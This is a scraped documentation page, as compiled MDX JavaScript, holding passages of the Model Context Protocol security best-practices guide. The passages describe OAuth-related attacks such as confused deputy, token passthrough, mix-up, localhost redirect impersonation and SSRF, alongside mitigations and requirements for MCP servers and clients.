run`]}),`\n`]}),`\n`,_jsx(Heading,{level:`4`,id:`mitigation-7`,children:`Mitigation`}),`\n`,_jsx(_components.p,{children:`The primary defense is to prevent classes of vulnerabilities that enable this attack vector:`}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[`Implement the mitigations described in `,_jsx(_components.a,{href:`#oauth-authorization-url-validation`,children:`OAuth Authorization URL Validation`})]}),`\n`,_jsx(_components.li,{children:`Use Content Security Policy (CSP) to prevent JavaScript execution from untrusted sources`}),`\n`,_jsx(_components.li,{children:`Validate and sanitize all input from MCP servers before processing`}),`\n`]}),`\n`,_jsx(_components.p,{children:`Since XSS fundamentally compromises the client’s security context, focus on limiting the damage:`}),`\n`,_jsx(_components.p,{children:_jsx(_components.strong,{children:`stdio Transport Restrictions`})}),`\n`,_jsxs(_components.p,{children:[`MCP proxy services `,_jsx(_components.strong,{children:`SHOULD`}),` implement additional security controls for `,_jsx(_components.code,{children:`stdio`}),` transport:`]}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsx(_components.li,{children:`Implement sandboxing or containerization for spawned processes`}),`\n`,_jsx(_components.li,{children:`Restrict file system access for spawned MCP servers`}),`\n`,_jsxs(_components.li,{children:[`Log all `,_jsx(_components.code,{children:`stdio`}),` transport usage for security monitoring`]}),`\n`,_jsx(_components.li,{children:`Require additional authorization for potentially dangerous commands`}),`\n`]}),`\n`,_jsx(_components.p,{children:_jsx(_components.strong,{children:`Client-Side Protections`})}),`\n`,_jsxs(_components.p,{children:[`MCP clients `,_jsx(_components.strong,{children:`SHOULD`}),` implement defense-in-depth measures:`]}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsx(_components.li,{children:`Isolate proxy communication in a separate security context when possible`}),`\n`,_jsx(_components.li,{children:`Use principle of least privilege for proxy process permissions`}),`\n`,_jsx(_components.li,{children:`Implement process-level sandboxing for the proxy service itself`}),`\n`,_jsx(_components.li,{children:`Consider running the proxy in a container or restricted environment`}),`\n`]}),`\n`,_jsx(Heading,{level:`3`,id:`mix-up-attacks`,children:`Mix-Up Attacks`}),`\n`,_jsx(Heading,{level:`4`,id:`attack-description-7`,children:`Attack Description`}),`\n`,_jsxs(_components.p,{children:[`An MCP client typically interacts with many authorization servers\nover its lifetime. An attacker that controls one of those\nauthorization servers may attempt to have the client send it an\nauthorization code or token issued by a different, honest\nauthorization server (a mix-up attack, described in\n`,_jsx(_components.a,{href:`https://datatracker.ietf.org/doc/html/rfc9207#section-1`,children:`RFC9207 Section 1`}),`).`]}),`\n`,_jsx(Heading,{level:`4`,id:`mitigation-8`,children:`Mitigation`}),`\n`,_jsxs(_components.p,{children:[_jsx(_components.a,{href:`/specification/2026-07-28/basic/authorization#authorization-response-validation`,children:`Authorization Response Validation`}),`\nmitigates this by binding the response to the authorization server\nthe client recorded before redirecting, so the authorization code\ncannot be redeemed at an unintended token endpoint. PKCE alone does\nnot prevent this attack because the client transmits the\n`,_jsx(_components.code,{children:`code_verifier`}),` to the attacker’s token endpoint. Resource indicators\ndo not help when the attacker’s authorization server is intercepting\nrequests before they hit the honest authorization server. This\nmitigation depends on honest authorization servers emitting `,_jsx(_components.code,{children:`iss`}),`; it\nprovides no protection against an honest server that does not.`]}),`\n`,_jsx(Heading,{level:`3`,id:`localhost-redirect-uri-impersonation`,children:`Localhost Redirect URI Impersonation`}),`\n`,_jsxs(_components.p,{children:[`Native and locally-running MCP clients commonly use `,_jsx(_components.code,{children:`localhost`}),`\nredirect URIs. When clients identify themselves with\n`,_jsx(_components.a,{href:`/specification/2026-07-28/basic/authorization/client-registration#client-id-metadata-documents`,children:`Client ID Metadata Documents`}),`,\nthe metadata document proves control of a domain, but it cannot prove\nwhich local process is listening on a `,_jsx(_components.code,{children:`localhost`}),` redirect URI.`]}),`\n`,_jsx(Heading,{level:`4`,id:`attack-description-8`,children:`Attack Description`}),`\n`,_jsx(_components.p,{children:`An attacker can claim to be any client by:`}),`\n`,_jsxs(_components.ol,{children:[`\n`,_jsxs(_components.li,{children:[`Providing the legitimate client’s metadata URL as their `,_jsx(_components.code,{children:`client_id`})]}),`\n`,_jsxs(_components.li,{children:[`Binding to any `,_jsx(_components.code,{children:`localhost`}),` port, and providing that address as\nthe redirect_uri`]}),`\n`,_jsx(_components.li,{children:`Receiving the authorization code via the redirect when the user\napproves`}),`\n`]}),`\n`,_jsx(_components.p,{children:`The server will see the legitimate client’s metadata document and the\nuser will see the legitimate client’s name, making attack detection\ndifficult.`}),`\n`,_jsx(Heading,{level:`4`,id:`mitigation-9`,children:`Mitigation`}),`\n`,_jsxs(_components.p,{children:[`See\n`,_jsx(_components.a,{href:`/specification/2026-07-28/basic/authorization/security-considerations#localhost-redirect-uri-risks`,children:`Localhost Redirect URI Risks`}),`\nin the authorization specification for the countermeasures expected\nof authorization servers, including displaying additional warnings for\n`,_jsx(_components.code,{children:`localhost`}),`-only redirect URIs and clearly displaying the redirect URI\nhostname during authorization.`]}),`\n`,_jsx(Heading,{level:`3`,id:`cimd-trust-policies`,children:`CIMD Trust Policies`}),`\n`,_jsxs(_components.p,{children:[`Authorization servers that accept\n`,_jsx(_components.a,{href:`/specification/2026-07-28/basic/authorization/client-registration#client-id-metadata-documents`,children:`Client ID Metadata Documents`}),`\ncan apply domain-based trust policies to decide which URL-based\nclient IDs to accept:`]}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsx(_components.li,{children:`Allowlists for trusted domains (for protected servers)`}),`\n`,_jsxs(_components.li,{children:[`Accept any HTTPS `,_jsx(_components.code,{children:`client_id`}),` (for open servers)`]}),`\n`,_jsx(_components.li,{children:`Reputation checks for unknown domains`}),`\n`,_jsx(_components.li,{children:`Restrictions based on domain age or certificate validation`}),`\n`,_jsx(_components.li,{children:`Display the CIMD and other associated client hostnames prominently\nto prevent phishing`}),`\n`]}),`\n`,_jsxs(_components.p,{children:[`Servers maintain full control over their access policies. See\n`,_jsx(_components.a,{href:`/specification/2026-07-28/basic/authorization/security-considerations#trust-policies`,children:`Trust Policies`}),`\nin the authorization specification, along with\n`,_jsx(_components.a,{href:`https://www.ietf.org/archive/id/draft-ietf-oauth-client-id-metadata-document-00.html#section-6.4`,children:`Section 6.4`}),`\nand\n`,_jsx(_components.a,{href:`https://www.ietf.org/archive/id/draft-ietf-oauth-client-id-metadata-document-00.html#section-6.8`,children:`Section 6.8`}),`\nof the Client ID Metadata Document specification, for more details.`]}),`\n`,_jsx(Heading,{level:`3`,id:`scope-minimization`,children:`Scope Minimization`}),`\n`,_jsx(_components.p,{children:`Poor scope design increases token compromise impact, elevates user\nfriction, and obscures audit trails.`}),`\n`,_jsx(Heading,{level:`4`,id:`attack-description-9`,children:`Attack Description`}),`\n`,_jsxs(_components.p,{children:[`An attacker obtains (via log leakage, memory scraping, or local\ninterception) an access token carrying broad scopes (`,_jsx(_components.code,{children:`files:*`}),`, `,_jsx(_components.code,{children:`db:*`}),`,\n`,_jsx(_components.code,{children:`admin:*`}),`) that were granted up front because the MCP server exposed\nevery scope in `,_jsx(_components.code,{children:`scopes_supported`}),` and the client requested them all.\nThe token enables lateral data access, privilege chaining, and difficult\nrevocation without re-consenting the entire surface.`]}),`\n`,_jsx(Heading,{level:`4`,id:`risks-6`,children:`Risks`}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsx(_components.li,{children:`Expanded blast radius: stolen broad token enables unrelated\ntool/resource access`}),`\n`,_jsx(_components.li,{children:`Higher friction on revocation: revoking a max-privilege token disrupts\nall workflows`}),`\n`,_jsx(_components.li,{children:`Audit noise: single omnibus scope masks user intent per operation`}),`\n`,_jsx(_components.li,{children:`Privilege chaining: attacker can immediately invoke high-risk tools\nwithout further elevation prompts`}),`\n`,_jsx(_components.li,{children:`Consent abandonment: users decline dialogs listing excessive scopes`}),`\n`,_jsx(_components.li,{children:`Scope inflation blindness: lack of metrics makes over-broad requests\nnormalised`}),`\n`]}),`\n`,_jsx(Heading,{level:`4`,id:`mitigation-10`,children:`Mitigation`}),`\n`,_jsx(_components.p,{children:`Implement a progressive, least-privilege scope model:`}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[`Minimal initial scope set (e.g., `,_jsx(_components.code,{children:`mcp:tools-basic`}),`) containing only\nlow-risk discovery/read operations`]}),`\n`,_jsxs(_components.li,{children:[`Incremental elevation via targeted `,_jsx(_components.code,{children:`WWW-Authenticate`}),` `,_jsx(_components.code,{children:`scope=\"...\"`}),`\nchallenges when privileged operations are first attempted`]}),`\n`,_jsx(_components.li,{children:`Down-scoping tolerance: server should accept reduced scope tokens;\nauth server MAY issue a subset of requested scopes`}),`\n`]}),`\n`,_jsx(_components.p,{children:`Server guidance:`}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsx(_components.li,{children:`Emit precise scope challenges; avoid returning the full catalog`}),`\n`,_jsx(_components.li,{children:`Log elevation events (scope requested, granted subset) with\ncorrelation IDs`}),`\n`]}),`\n`,_jsx(_components.p,{children:`Servers have flexibility in determining which scopes to include:`}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Minimum approach`}),`: Include only the scopes required for the\nspecific operation that triggered the error.`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Recommended approach`}),`: Include the scopes required for the\ncurrent operation along with related scopes that commonly work\ntogether, to reduce the number of step-up authorization rounds.`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Extended approach`}),`: Include the scopes required for the\ncurrent operation, related scopes, and any other scopes the\nserver anticipates the client may need in the near future.`]}),`\n`]}),`\n`,_jsx(_components.p,{children:`The choice depends on the server’s assessment of user experience impact and authorization friction.`}),`\n`,_jsx(_components.p,{children:`Client guidance:`}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[`Begin with only baseline scopes (or those specified by initial\n`,_jsx(_components.code,{children:`WWW-Authenticate`}),`)`]}),`\n`,_jsx(_components.li,{children:`Cache recent failures to avoid repeated elevation loops for denied\nscopes`}),`\n`]}),`\n`,_jsxs(_components.p,{children:[`When the initial `,_jsx(_components.code,{children:`WWW-Authenticate`}),` challenge carries no `,_jsx(_components.code,{children:`scope`}),`\nparameter, the\n`,_jsx(_components.a,{href:`/specification/2026-07-28/basic/authorization#scope-selection-strategy`,children:`Scope Selection Strategy`}),`\ndirects clients to fall back to requesting all scopes listed in\n`,_jsx(_components.code,{children:`scopes_supported`}),`. This approach accommodates the general-purpose\nnature of MCP clients, which typically lack domain-specific knowledge\nto make informed decisions about individual scope selection.\nRequesting all available scopes allows the authorization server and\nend-user to determine appropriate permissions during the consent\nprocess, minimizing user friction while following the principle of\nleast privilege.`]}),`\n`,_jsx(Note,{children:_jsxs(_components.p,{children:[`Scope accumulation across operations is a client-side responsibility. Clients\n`,_jsx(_components.strong,{children:`SHOULD`}),` compute the union of previously requested scopes and newly\nchallenged scopes when initiating re-authorization, as described in `,_jsx(_components.a,{href:`/specification/2026-07-28/basic/authorization#step-up-authorization-flow`,children:`Step-Up\nAuthorization\nFlow`}),`.\nThis allows servers to remain stateless with respect to client scope sets\nwhile ensuring clients do not lose previously granted permissions.`]})}),`\n`,_jsx(Note,{children:_jsxs(_components.p,{children:[_jsx(_components.strong,{children:`Hierarchical scopes`}),`: Some authorization servers define scope hierarchies\nwhere a broader scope implies narrower ones (for example, an `,_jsx(_components.code,{children:`admin`}),` scope\nthat subsumes `,_jsx(_components.code,{children:`read`}),`). When accumulating scopes, the client’s union may\ncontain semantically redundant entries. For example, a token previously\ngranted a broad scope may be challenged with a narrower one it already\nimplies. Clients need not deduplicate hierarchically; authorization servers\ntypically normalize such redundancy during token issuance. Servers, for their\npart, must account for hierarchy when deciding whether a token is sufficient\nfor an operation, but this does not affect the scopes they emit in a\nchallenge.`]})}),`\n`,_jsx(Heading,{level:`4`,id:`common-mistakes`,children:`Common Mistakes`}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[`Publishing all possible scopes in `,_jsx(_components.code,{children:`scopes_supported`})]}),`\n`,_jsxs(_components.li,{children:[`Using wildcard or omnibus scopes (`,_jsx(_components.code,{children:`*`}),`, `,_jsx(_components.code,{children:`all`}),`, `,_jsx(_components.code,{children:`full-access`}),`)`]}),`\n`,_jsx(_components.li,{children:`Bundling unrelated privileges to preempt future prompts`}),`\n`,_jsx(_components.li,{children:`Returning entire scope catalog in every challenge`}),`\n`,_jsx(_components.li,{children:`Silent scope semantic changes without versioning`}),`\n`,_jsx(_components.li,{children:`Treating claimed scopes in token as sufficient without server-side\nauthorization logic`}),`\n`]}),`\n`,_jsx(_components.p,{children:`Proper minimization constrains compromise impact, improves audit\nclarity, and reduces consent churn.`})]})}function MDXContent(props={}){const{wrapper:MDXLayout}={..._provideComponents(),...props.components};return MDXLayout?_jsx(MDXLayout,{...props,children:_jsx(_createMdxContent,{...props})}):_createMdxContent(props)}return{default:MDXContent};function _missingMdxReference(id,component){throw new Error(`Expected `+(component?`component`:`object`)+\" `\"+id+\"` to be defined: you likely forgot to import, pass, or provide it.\")}"])</script><script>self.__next_f.push([1,"5a:Tfdb6,"])</script><script>self.__next_f.push([1,"\"use strict\";const{Fragment:_Fragment,jsx:_jsx,jsxs:_jsxs}=arguments[0];const{useMDXComponents:_provideComponents}=arguments[0];function _createMdxContent(props){const _components={a:`a`,code:`code`,em:`em`,h5:`h5`,li:`li`,ol:`ol`,p:`p`,pre:`pre`,span:`span`,strong:`strong`,ul:`ul`,..._provideComponents(),...props.components},{CodeBlock,Heading,Mermaid,Note}=_components;if(!CodeBlock)_missingMdxReference(`CodeBlock`,true);if(!Heading)_missingMdxReference(`Heading`,true);if(!Mermaid)_missingMdxReference(`Mermaid`,true);if(!Note)_missingMdxReference(`Note`,true);return _jsxs(_Fragment,{children:[_jsx(Heading,{level:`2`,id:`introduction`,children:`Introduction`}),`\n`,_jsx(Heading,{level:`3`,id:`purpose-and-scope`,children:`Purpose and Scope`}),`\n`,_jsxs(_components.p,{children:[`This document provides security considerations for the Model Context\nProtocol (MCP), complementing the\n`,_jsx(_components.a,{href:`/specification/latest/basic/authorization`,children:`MCP Authorization`}),`\nspecification. This document identifies security risks, attack vectors,\nand best practices specific to MCP implementations.`]}),`\n`,_jsxs(_components.p,{children:[`The primary audience for this document includes developers implementing\nMCP authorization flows, MCP server operators, and security\nprofessionals evaluating MCP-based systems. This document should be read\nalongside the MCP Authorization specification and\n`,_jsx(_components.a,{href:`https://datatracker.ietf.org/doc/html/rfc9700`,children:`OAuth 2.0 security best practices`}),`.`]}),`\n`,_jsx(Heading,{level:`2`,id:`attacks-and-mitigations`,children:`Attacks and Mitigations`}),`\n`,_jsx(_components.p,{children:`This section gives a detailed description of attacks on MCP\nimplementations, along with potential countermeasures.`}),`\n`,_jsx(Heading,{level:`3`,id:`confused-deputy-problem`,children:`Confused Deputy Problem`}),`\n`,_jsxs(_components.p,{children:[`Attackers can exploit MCP proxy servers that connect to third-party\nAPIs, creating\n“`,_jsx(_components.a,{href:`https://en.wikipedia.org/wiki/Confused_deputy_problem`,children:`confused deputy`}),`”\nvulnerabilities. This attack allows malicious clients to obtain\nauthorization codes without proper user consent by exploiting the\ncombination of static client IDs, dynamic client registration, and\nconsent cookies.`]}),`\n`,_jsx(Heading,{level:`4`,id:`terminology`,children:`Terminology`}),`\n`,_jsxs(_components.p,{children:[_jsx(_components.strong,{children:`MCP Proxy Server`}),`\n: An MCP server that connects MCP clients to third-party APIs, offering\nMCP features while delegating operations and acting as a single OAuth\nclient to the third-party API server.`]}),`\n`,_jsxs(_components.p,{children:[_jsx(_components.strong,{children:`Third-Party Authorization Server`}),`\n: Authorization server that protects the third-party API. It may lack\ndynamic client registration support, requiring the MCP proxy to use a\nstatic client ID for all requests.`]}),`\n`,_jsxs(_components.p,{children:[_jsx(_components.strong,{children:`Third-Party API`}),`\n: The protected resource server that provides the actual API\nfunctionality. Access to this API requires tokens issued by the\nthird-party authorization server.`]}),`\n`,_jsxs(_components.p,{children:[_jsx(_components.strong,{children:`Static Client ID`}),`\n: A fixed OAuth 2.0 client identifier used by the MCP proxy server when\ncommunicating with the third-party authorization server. This Client ID\nrefers to the MCP server acting as a client to the Third-Party API. It\nis the same value for all MCP server to Third-Party API interactions\nregardless of which MCP client initiated the request.`]}),`\n`,_jsx(Heading,{level:`4`,id:`vulnerable-conditions`,children:`Vulnerable Conditions`}),`\n`,_jsx(_components.p,{children:`This attack becomes possible when all of the following conditions are\npresent:`}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[`MCP proxy server uses a `,_jsx(_components.strong,{children:`static client ID`}),` with a third-party\nauthorization server`]}),`\n`,_jsxs(_components.li,{children:[`MCP proxy server allows MCP clients to `,_jsx(_components.strong,{children:`dynamically register`}),` (each\ngetting their own client_id)`]}),`\n`,_jsxs(_components.li,{children:[`The third-party authorization server sets a `,_jsx(_components.strong,{children:`consent cookie`}),` after\nthe first authorization`]}),`\n`,_jsx(_components.li,{children:`MCP proxy server does not implement proper per-client consent before\nforwarding to third-party authorization`}),`\n`]}),`\n`,_jsx(Heading,{level:`4`,id:`architecture-and-attack-flows`,children:`Architecture and Attack Flows`}),`\n`,_jsx(_components.h5,{children:`Normal OAuth proxy usage (preserves user consent)`}),`\n`,_jsx(Mermaid,{}),`\n`,_jsx(_components.h5,{children:`Malicious OAuth proxy usage (skips user consent)`}),`\n`,_jsx(Mermaid,{}),`\n`,_jsx(Heading,{level:`4`,id:`attack-description`,children:`Attack Description`}),`\n`,_jsx(_components.p,{children:`When an MCP proxy server uses a static client ID to authenticate with\na third-party authorization server, the following attack becomes\npossible:`}),`\n`,_jsxs(_components.ol,{children:[`\n`,_jsx(_components.li,{children:`A user authenticates normally through the MCP proxy server to access\nthe third-party API`}),`\n`,_jsx(_components.li,{children:`During this flow, the third-party authorization server sets a cookie\non the user agent indicating consent for the static client ID`}),`\n`,_jsx(_components.li,{children:`An attacker later sends the user a malicious link containing a\ncrafted authorization request which contains a malicious redirect URI\nalong with a new dynamically registered client ID`}),`\n`,_jsx(_components.li,{children:`When the user clicks the link, their browser still has the consent\ncookie from the previous legitimate request`}),`\n`,_jsx(_components.li,{children:`The third-party authorization server detects the cookie and skips the\nconsent screen`}),`\n`,_jsxs(_components.li,{children:[`The MCP authorization code is redirected to the attacker’s server\n(specified in the malicious `,_jsx(_components.code,{children:`redirect_uri`}),` parameter during\n`,_jsx(_components.a,{href:`/specification/latest/basic/authorization#dynamic-client-registration`,children:`dynamic client registration`}),`)`]}),`\n`,_jsx(_components.li,{children:`The attacker exchanges the stolen authorization code for access\ntokens for the MCP server without the user’s explicit approval`}),`\n`,_jsx(_components.li,{children:`The attacker now has access to the third-party API as the compromised\nuser`}),`\n`]}),`\n`,_jsx(Heading,{level:`4`,id:`mitigation`,children:`Mitigation`}),`\n`,_jsxs(_components.p,{children:[`To prevent confused deputy attacks, MCP proxy servers `,_jsx(_components.strong,{children:`MUST`}),` implement\nper-client consent and proper security controls as detailed below.`]}),`\n`,_jsx(_components.h5,{children:`Consent Flow Implementation`}),`\n`,_jsxs(_components.p,{children:[`The following diagram shows how to properly implement per-client consent\nthat runs `,_jsx(_components.strong,{children:`before`}),` the third-party authorization flow:`]}),`\n`,_jsx(Mermaid,{}),`\n`,_jsx(_components.h5,{children:`Required Protections`}),`\n`,_jsx(_components.p,{children:_jsx(_components.strong,{children:`Per-Client Consent Storage`})}),`\n`,_jsxs(_components.p,{children:[`MCP proxy servers `,_jsx(_components.strong,{children:`MUST`}),`:`]}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[`Maintain a registry of approved `,_jsx(_components.code,{children:`client_id`}),` values per user`]}),`\n`,_jsxs(_components.li,{children:[`Check this registry `,_jsx(_components.strong,{children:`before`}),` initiating the third-party\nauthorization flow`]}),`\n`,_jsx(_components.li,{children:`Store consent decisions securely (server-side database, or server\nspecific cookies)`}),`\n`]}),`\n`,_jsx(_components.p,{children:_jsx(_components.strong,{children:`Consent UI Requirements`})}),`\n`,_jsxs(_components.p,{children:[`The MCP-level consent page `,_jsx(_components.strong,{children:`MUST`}),`:`]}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsx(_components.li,{children:`Clearly identify the requesting MCP client by name`}),`\n`,_jsx(_components.li,{children:`Display the specific third-party API scopes being requested`}),`\n`,_jsxs(_components.li,{children:[`Show the registered `,_jsx(_components.code,{children:`redirect_uri`}),` where tokens will be sent`]}),`\n`,_jsx(_components.li,{children:`Implement CSRF protection (e.g., state parameter, CSRF tokens)`}),`\n`,_jsxs(_components.li,{children:[`Prevent iframing via `,_jsx(_components.code,{children:`frame-ancestors`}),` CSP directive or\n`,_jsx(_components.code,{children:`X-Frame-Options: DENY`}),` to prevent clickjacking`]}),`\n`]}),`\n`,_jsx(_components.p,{children:_jsx(_components.strong,{children:`Consent Cookie Security`})}),`\n`,_jsxs(_components.p,{children:[`If using cookies to track consent decisions, they `,_jsx(_components.strong,{children:`MUST`}),`:`]}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[`Use `,_jsx(_components.code,{children:`__Host-`}),` prefix for cookie names`]}),`\n`,_jsxs(_components.li,{children:[`Set `,_jsx(_components.code,{children:`Secure`}),`, `,_jsx(_components.code,{children:`HttpOnly`}),`, and `,_jsx(_components.code,{children:`SameSite=Lax`}),` attributes`]}),`\n`,_jsx(_components.li,{children:`Be cryptographically signed or use server-side sessions`}),`\n`,_jsxs(_components.li,{children:[`Bind to the specific `,_jsx(_components.code,{children:`client_id`}),` (not just “user has consented”)`]}),`\n`]}),`\n`,_jsx(_components.p,{children:_jsx(_components.strong,{children:`Redirect URI Validation`})}),`\n`,_jsxs(_components.p,{children:[`The MCP proxy server `,_jsx(_components.strong,{children:`MUST`}),`:`]}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[`Validate that the `,_jsx(_components.code,{children:`redirect_uri`}),` in authorization requests exactly\nmatches the registered URI`]}),`\n`,_jsxs(_components.li,{children:[`Reject requests if the `,_jsx(_components.code,{children:`redirect_uri`}),` has changed without\nre-registration`]}),`\n`,_jsx(_components.li,{children:`Use exact string matching (not pattern matching or wildcards)`}),`\n`]}),`\n`,_jsx(_components.p,{children:_jsx(_components.strong,{children:`OAuth State Parameter Validation`})}),`\n`,_jsxs(_components.p,{children:[`The OAuth `,_jsx(_components.code,{children:`state`}),` parameter is critical to prevent authorization code\ninterception and CSRF attacks. Proper state validation ensures that\nconsent approval at the authorization endpoint is enforced at the\ncallback endpoint.`]}),`\n`,_jsxs(_components.p,{children:[`MCP proxy servers implementing OAuth flows `,_jsx(_components.strong,{children:`MUST`}),`:`]}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[`Generate a cryptographically secure random `,_jsx(_components.code,{children:`state`}),` value for each\nauthorization request`]}),`\n`,_jsxs(_components.li,{children:[`Store the `,_jsx(_components.code,{children:`state`}),` value server-side (in a secure session store or\nencrypted cookie) `,_jsx(_components.strong,{children:`only after`}),` consent has been explicitly approved`]}),`\n`,_jsxs(_components.li,{children:[`Set the `,_jsx(_components.code,{children:`state`}),` tracking cookie/session `,_jsx(_components.strong,{children:`immediately before`}),`\nredirecting to the third-party identity provider (not before consent\napproval)`]}),`\n`,_jsxs(_components.li,{children:[`Validate at the callback endpoint that the `,_jsx(_components.code,{children:`state`}),` query parameter\nexactly matches the stored value in the callback request’s cookies or\nin the request’s cookie-based session`]}),`\n`,_jsxs(_components.li,{children:[`Reject any callback requests where the `,_jsx(_components.code,{children:`state`}),` parameter is missing\nor does not match`]}),`\n`,_jsxs(_components.li,{children:[`Ensure `,_jsx(_components.code,{children:`state`}),` values are single-use (delete after validation) and\nhave a short expiration time (e.g., 10 minutes)`]}),`\n`]}),`\n`,_jsxs(_components.p,{children:[`The consent cookie or session containing the `,_jsx(_components.code,{children:`state`}),` value `,_jsx(_components.strong,{children:`MUST NOT`}),`\nbe set until `,_jsx(_components.strong,{children:`after`}),` the user has approved the consent screen at the\nMCP server’s authorization endpoint. Setting this cookie before consent\napproval renders the consent screen ineffective, as an attacker could\nbypass it by crafting a malicious authorization request.`]}),`\n`,_jsx(Heading,{level:`3`,id:`token-passthrough`,children:`Token Passthrough`}),`\n`,_jsxs(_components.p,{children:[`“Token passthrough” is an anti-pattern where an MCP server accepts\ntokens from an MCP client without validating that the tokens were\nproperly issued `,_jsx(_components.em,{children:`to the MCP server`}),` and passes them through to the\ndownstream API.`]}),`\n`,_jsx(_components.p,{children:`An attacker can gain unauthorized access or otherwise compromise an\nMCP server if the server accepts tokens issued for other resources.\nThis vulnerability has two critical dimensions:`}),`\n`,_jsxs(_components.ol,{children:[`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Audience validation failures.`}),` When an MCP server doesn’t verify\nthat tokens were specifically intended for it (for example, via the\naudience claim, as mentioned in\n`,_jsx(_components.a,{href:`https://www.rfc-editor.org/rfc/rfc9068.html`,children:`RFC9068`}),`), it may\naccept tokens originally issued for other services. This breaks a\nfundamental OAuth security boundary, allowing attackers to reuse\nlegitimate tokens across different services than intended.`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Token passthrough.`}),` If the MCP server not only accepts tokens\nwith incorrect audiences but also forwards these unmodified tokens\nto downstream services, it can potentially cause the\n`,_jsx(_components.a,{href:`#confused-deputy-problem`,children:`“confused deputy” problem`}),`, where the\ndownstream API may incorrectly trust the token as if it came from\nthe MCP server or assume the token was validated by the upstream\nAPI.`]}),`\n`]}),`\n`,_jsx(Heading,{level:`4`,id:`risks`,children:`Risks`}),`\n`,_jsxs(_components.p,{children:[`Token passthrough is explicitly forbidden in the\n`,_jsx(_components.a,{href:`/specification/latest/basic/authorization`,children:`authorization specification`}),`\nas it introduces a number of security risks, that include:`]}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Security Control Circumvention`}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsx(_components.li,{children:`The MCP Server or downstream APIs might implement important security\ncontrols like rate limiting, request validation, or traffic\nmonitoring, that depend on the token audience or other credential\nconstraints. If clients can obtain and use tokens directly with the\ndownstream APIs without the MCP server validating them properly or\nensuring that the tokens are issued for the right service, they\nbypass these controls.`}),`\n`]}),`\n`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Accountability and Audit Trail Issues`}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsx(_components.li,{children:`The MCP Server will be unable to identify or distinguish between MCP\nClients when clients are calling with an upstream-issued access token\nwhich may be opaque to the MCP Server.`}),`\n`,_jsx(_components.li,{children:`The downstream Resource Server’s logs may show requests that appear\nto come from a different source with a different identity, rather\nthan the MCP server that is actually forwarding the tokens.`}),`\n`,_jsx(_components.li,{children:`Both factors make incident investigation, controls, and auditing\nmore difficult.`}),`\n`,_jsx(_components.li,{children:`If the MCP Server passes tokens without validating their claims\n(e.g., roles, privileges, or audience) or other metadata, a\nmalicious actor in possession of a stolen token can use the server\nas a proxy for data exfiltration.`}),`\n`]}),`\n`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Trust Boundary Issues`}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsx(_components.li,{children:`The downstream Resource Server grants trust to specific entities.\nThis trust might include assumptions about origin or client behavior\npatterns. Breaking this trust boundary could lead to unexpected\nissues.`}),`\n`,_jsx(_components.li,{children:`If the token is accepted by multiple services without proper\nvalidation, an attacker compromising one service can use the token\nto access other connected services.`}),`\n`]}),`\n`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Future Compatibility Risk`}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsx(_components.li,{children:`Even if an MCP Server starts as a “pure proxy” today, it might need\nto add security controls later. Starting with proper token audience\nseparation makes it easier to evolve the security model.`}),`\n`]}),`\n`]}),`\n`]}),`\n`,_jsx(Heading,{level:`4`,id:`mitigation-2`,children:`Mitigation`}),`\n`,_jsxs(_components.p,{children:[`MCP servers `,_jsx(_components.strong,{children:`MUST NOT`}),` accept any tokens that were not explicitly\nissued for the MCP server.`]}),`\n`,_jsx(Heading,{level:`3`,id:`server-side-request-forgery-ssrf`,children:`Server-Side Request Forgery (SSRF)`}),`\n`,_jsx(_components.p,{children:`Server-Side Request Forgery (SSRF) is an attack where an attacker can\ninduce an MCP client to make HTTP requests to unintended destinations,\npotentially accessing internal network resources, cloud metadata\nendpoints, or other protected services.`}),`\n`,_jsx(Heading,{level:`4`,id:`attack-description-2`,children:`Attack Description`}),`\n`,_jsx(_components.p,{children:`During OAuth metadata discovery, MCP clients fetch URLs from several\nsources that could be controlled by a malicious MCP server:`}),`\n`,_jsxs(_components.ol,{children:[`\n`,_jsxs(_components.li,{children:[`The `,_jsx(_components.code,{children:`resource_metadata`}),` URL from the `,_jsx(_components.code,{children:`WWW-Authenticate`}),` header`]}),`\n`,_jsxs(_components.li,{children:[`The `,_jsx(_components.code,{children:`authorization_servers`}),` URLs from the Protected Resource Metadata\ndocument`]}),`\n`,_jsxs(_components.li,{children:[`The `,_jsx(_components.code,{children:`token_endpoint`}),`, `,_jsx(_components.code,{children:`authorization_endpoint`}),`, and other URLs from\nAuthorization Server Metadata`]}),`\n`]}),`\n`,_jsx(_components.p,{children:`A malicious MCP server can populate these fields with URLs pointing to\ninternal resources, enabling the following attack patterns:`}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Direct internal IP access`}),`: URLs like 